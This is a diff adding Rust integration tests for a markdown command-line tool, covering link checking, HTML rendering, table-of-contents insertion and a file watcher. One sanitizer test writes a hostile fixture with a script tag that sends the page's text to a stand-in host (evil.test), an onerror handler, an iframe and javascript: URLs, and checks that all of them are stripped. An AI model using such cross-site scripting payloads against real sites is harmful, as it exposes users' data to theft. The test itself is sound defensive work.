@@ -1322,3 +1322,325 @@ fn render_html_carries_data_mk_state_and_neutral_chips() {
     // No JavaScript, still.
     assert!(!html.contains("<script"), "rendered HTML must ship no JS");
 }
+
+// ---------------------------------------------------------------------------
+// mark links
+// ---------------------------------------------------------------------------
+
+/// A small notes directory with one of each kind of destination, so the
+/// classification and the `stat` are both exercised against a real filesystem.
+fn link_fixture() -> (TempDir, PathBuf) {
+    let dir = tempfile::tempdir().expect("tempdir");
+    std::fs::create_dir(dir.path().join("assets")).expect("assets");
+    std::fs::write(dir.path().join("assets/there.png"), b"x").expect("image");
+    std::fs::write(dir.path().join("other.md"), "# Other\n").expect("sibling");
+    let notes = dir.path().join("notes.md");
+    std::fs::write(
+        &notes,
+        "# Notes\n\n\
+         ![here](assets/there.png)\n\
+         ![gone](assets/gone.png)\n\
+         [sibling](other.md)\n\
+         [missing](nope.md)\n\
+         [web](https://example.com)\n\
+         [anchor](#notes)\n",
+    )
+    .expect("notes");
+    (dir, notes)
+}
+
+#[test]
+fn links_reports_every_destination_in_source_order() {
+    let (_dir, notes) = link_fixture();
+    let output = run(&["links", notes.to_str().unwrap()]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    let out = stdout(&output);
+    let lines: Vec<&str> = out.lines().map(str::trim).collect();
+    assert_eq!(lines.len(), 6, "six references: {lines:?}");
+    assert!(lines[0].ends_with("assets/there.png"), "{:?}", lines[0]);
+    assert!(lines[1].ends_with("(missing)"), "{:?}", lines[1]);
+    assert!(lines[4].ends_with("(not checked)"), "{:?}", lines[4]);
+}
+
+#[test]
+fn links_broken_reports_only_missing_local_targets() {
+    let (_dir, notes) = link_fixture();
+    let output = run(&["links", "--broken", notes.to_str().unwrap()]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    let out = stdout(&output);
+    assert!(out.contains("assets/gone.png"), "{out}");
+    assert!(out.contains("nope.md"), "{out}");
+    // An unreachable website is not a broken link: this command never makes a
+    // network request, so it must not claim to know.
+    assert!(!out.contains("example.com"), "{out}");
+    // Nor is a fragment, which resolves inside the document.
+    assert!(!out.contains('#'), "{out}");
+}
+
+#[test]
+fn links_images_leaves_links_out() {
+    let (_dir, notes) = link_fixture();
+    let output = run(&["links", "--images", notes.to_str().unwrap()]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    let out = stdout(&output);
+    assert!(out.contains("assets/there.png"), "{out}");
+    assert!(!out.contains("other.md"), "{out}");
+}
+
+#[test]
+fn links_json_resolves_to_absolute_paths() {
+    let (_dir, notes) = link_fixture();
+    let output = run(&["links", "--images", "--json", notes.to_str().unwrap()]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    let rows: serde_json::Value = serde_json::from_str(&stdout(&output)).expect("json");
+    let rows = rows.as_array().expect("array");
+    assert_eq!(rows.len(), 2);
+    let resolved = rows[0]["resolved"].as_str().expect("resolved");
+    assert!(
+        Path::new(resolved).is_absolute(),
+        "a script should be able to use this from any directory: {resolved}"
+    );
+    assert_eq!(rows[0]["exists"], serde_json::json!(true));
+    assert_eq!(rows[1]["exists"], serde_json::json!(false));
+}
+
+#[test]
+fn links_walks_a_directory() {
+    let (dir, _notes) = link_fixture();
+    let output = run(&["links", "--broken", dir.path().to_str().unwrap()]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    assert!(stdout(&output).contains("nope.md"), "{}", stdout(&output));
+}
+
+#[test]
+fn links_of_a_directory_with_nothing_broken_says_nothing_and_exits_zero() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    std::fs::write(dir.path().join("a.md"), "# A\n\n[web](https://x.test)\n").expect("write");
+    let output = run(&["links", "--broken", dir.path().to_str().unwrap()]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    assert_eq!(stdout(&output), "", "an empty answer, not an error");
+}
+
+// ---------------------------------------------------------------------------
+// Embedded HTML is filtered, in `render --html` as well as in the window
+// ---------------------------------------------------------------------------
+
+/// `2026-09-01-filter-embedded-html` in one assertion each.
+///
+/// These are on the **binary**, not on `sanitize::fragment`, because the unit
+/// tests can only say the filter works — they cannot say it is wired into the
+/// path a reader actually gets. The bug was that it was not wired in at all.
+#[test]
+fn rendered_html_never_carries_a_script() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let file = dir.path().join("hostile.md");
+    std::fs::write(
+        &file,
+        "# Notes\n\n\
+         <script>fetch('https://evil.test/?'+document.body.innerText)</script>\n\n\
+         <img src=x onerror=\"alert(1)\">\n\n\
+         <iframe src=\"https://evil.test\"></iframe>\n\n\
+         [click](javascript:alert(1))\n\n\
+         <a href=\"JaVaScRiPt:alert(1)\">or here</a>\n",
+    )
+    .expect("write");
+
+    let output = run(&["render", file.to_str().unwrap(), "--html"]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    let html = stdout(&output);
+
+    // The README calls this output self-contained with no JavaScript. That has
+    // to be true of a document someone else wrote.
+    assert!(!html.contains("<script"), "a script survived:\n{html}");
+    assert!(!html.contains("<iframe"), "an iframe survived");
+    assert!(!html.contains("onerror"), "an event handler survived");
+    assert!(
+        !html.to_ascii_lowercase().contains("javascript:"),
+        "a javascript: URL survived"
+    );
+}
+
+#[test]
+fn rendered_html_keeps_the_markup_a_note_legitimately_uses() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let file = dir.path().join("note.md");
+    std::fs::write(
+        &file,
+        "# Notes\n\nPress <kbd>⌘F</kbd>, and H<sub>2</sub>O.\n\n\
+         <details>\n<summary>more</summary>\n\nbody\n\n</details>\n",
+    )
+    .expect("write");
+
+    let output = run(&["render", file.to_str().unwrap(), "--html"]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    let html = stdout(&output);
+    assert!(html.contains("<kbd>"), "kbd was filtered out:\n{html}");
+    assert!(html.contains("<sub>"), "sub was filtered out");
+    // The unbalanced case: opened in one block, closed three blocks later.
+    assert!(html.contains("<details>"), "details was filtered out");
+    assert!(
+        html.contains("</details>"),
+        "the close tag was filtered out"
+    );
+}
+
+// ---------------------------------------------------------------------------
+// mark toc --insert
+// ---------------------------------------------------------------------------
+
+fn toc_fixture() -> (TempDir, PathBuf) {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let path = dir.path().join("doc.md");
+    std::fs::write(
+        &path,
+        "# Title\n\n<!-- toc -->\n<!-- /toc -->\n\n## First\n\ntext\n\n### Nested\n\nmore\n",
+    )
+    .expect("write");
+    (dir, path)
+}
+
+#[test]
+fn toc_insert_writes_between_the_markers() {
+    let (_dir, path) = toc_fixture();
+    let output = run(&["toc", path.to_str().unwrap(), "--insert"]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+
+    let after = std::fs::read_to_string(&path).expect("read");
+    assert!(after.contains("- [First](#first)"), "{after}");
+    assert!(after.contains("  - [Nested](#nested)"), "{after}");
+    // Everything outside the markers is untouched.
+    assert!(after.starts_with("# Title\n"), "{after}");
+    assert!(after.contains("\n## First\n\ntext\n"), "{after}");
+}
+
+#[test]
+fn toc_insert_is_idempotent() {
+    let (_dir, path) = toc_fixture();
+    run(&["toc", path.to_str().unwrap(), "--insert"]);
+    let once = std::fs::read_to_string(&path).expect("read");
+    run(&["toc", path.to_str().unwrap(), "--insert"]);
+    let twice = std::fs::read_to_string(&path).expect("read");
+    // Running it again must replace what it wrote, not stack a second copy.
+    assert_eq!(once, twice);
+}
+
+#[test]
+fn toc_insert_refuses_rather_than_guessing_where_to_put_it() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let path = dir.path().join("bare.md");
+    std::fs::write(&path, "# Title\n\n## First\n").expect("write");
+
+    let output = run(&["toc", path.to_str().unwrap(), "--insert"]);
+    assert_eq!(code(&output), 1, "usage, not success");
+    assert!(
+        stderr(&output).contains("<!-- toc -->"),
+        "{}",
+        stderr(&output)
+    );
+    // And it wrote nothing.
+    assert_eq!(
+        std::fs::read_to_string(&path).expect("read"),
+        "# Title\n\n## First\n"
+    );
+}
+
+#[test]
+fn toc_insert_honours_the_level_range() {
+    let (_dir, path) = toc_fixture();
+    let output = run(&[
+        "toc",
+        path.to_str().unwrap(),
+        "--insert",
+        "--min-level",
+        "1",
+        "--max-level",
+        "2",
+    ]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    let after = std::fs::read_to_string(&path).expect("read");
+    // Between the markers only: `### Nested` is still in the document body,
+    // which is exactly what "the list changed and nothing else did" means.
+    let open = after.find("<!-- toc -->").expect("open marker");
+    let close = after.find("<!-- /toc -->").expect("close marker");
+    let list = &after[open..close];
+    assert!(list.contains("- [Title](#title)"), "{list}");
+    assert!(!list.contains("Nested"), "level 3 was listed: {list}");
+    assert!(
+        after.contains("### Nested"),
+        "the body was rewritten: {after}"
+    );
+}
+
+#[test]
+fn toc_without_insert_still_prints_and_writes_nothing() {
+    let (_dir, path) = toc_fixture();
+    let before = std::fs::read_to_string(&path).expect("read");
+    let output = run(&["toc", path.to_str().unwrap()]);
+    assert_eq!(code(&output), 0, "{}", stderr(&output));
+    assert!(stdout(&output).contains("Title"));
+    assert_eq!(std::fs::read_to_string(&path).expect("read"), before);
+}
+
+// ---------------------------------------------------------------------------
+// mark watch
+// ---------------------------------------------------------------------------
+
+#[test]
+fn watch_blocks_until_something_changes_then_exits() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let path = dir.path().join("notes.md");
+    std::fs::write(&path, "# Notes\n").expect("write");
+
+    // The walk `mark watch` does is the same one `mark ls` does, so if this is
+    // empty the watcher has nothing to watch and the rest of the test is
+    // meaningless. Asserted rather than assumed, because a hanging watcher and
+    // a watcher looking at nothing are indistinguishable from the outside.
+    let listing = run(&["ls", dir.path().to_str().unwrap(), "--json"]);
+    assert!(
+        stdout(&listing).contains("notes.md"),
+        "the watcher's own walk does not see the fixture: {}",
+        stdout(&listing)
+    );
+
+    let mut child = Command::new(binary())
+        .args([
+            "watch",
+            dir.path().to_str().unwrap(),
+            "--interval",
+            "0.1",
+            "--json",
+        ])
+        .stdout(std::process::Stdio::piped())
+        .spawn()
+        .expect("spawn");
+
+    // After the first poll, so the change is seen as a change rather than as
+    // the initial state.
+    std::thread::sleep(std::time::Duration::from_millis(400));
+    std::fs::write(&path, "# Notes\n\nedited\n").expect("write");
+
+    // Polled with a deadline rather than `wait_with_output`, which blocks
+    // forever: a watcher that never notices is a *failure*, and a test that
+    // hangs instead of failing tells nobody anything.
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
+    let status = loop {
+        match child.try_wait().expect("try_wait") {
+            Some(status) => break Some(status),
+            None if std::time::Instant::now() >= deadline => break None,
+            None => std::thread::sleep(std::time::Duration::from_millis(50)),
+        }
+    };
+    if status.is_none() {
+        let _ = child.kill();
+    }
+    let output = child.wait_with_output().expect("wait");
+    let text = String::from_utf8_lossy(&output.stdout).into_owned();
+
+    assert!(
+        status.is_some(),
+        "mark watch did not notice the change within 10 s; it printed {text:?}"
+    );
+    assert_eq!(status.and_then(|s| s.code()), Some(0));
+    assert!(text.contains("\"kind\":\"modified\""), "{text}");
+    assert!(text.contains("notes.md"), "{text}");
+}
